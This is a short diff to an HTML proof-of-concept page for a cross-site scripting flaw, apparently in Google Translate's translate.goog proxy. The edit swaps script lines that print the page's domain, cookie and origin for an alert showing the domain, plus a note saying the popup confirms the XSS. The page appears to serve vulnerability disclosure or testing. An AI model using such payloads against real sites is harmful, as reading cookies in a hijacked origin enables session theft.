@@ -1,10 +1,9 @@
 <html>
 <body>
-<h1>Translate XSS Test</h1>
+<h1>Google Translate XSS PoC</h1>
 <script>
-document.write("<h2>document.domain = " + document.domain + "</h2>");
-document.write("<h2>document.cookie = " + document.cookie + "</h2>");
-document.write("<h2>location.origin = " + location.origin + "</h2>");
+alert("XSS on: " + document.domain);
 </script>
+<p>If you see an alert popup showing "translate.goog" in the domain, XSS is confirmed.</p>
 </body>
 </html>
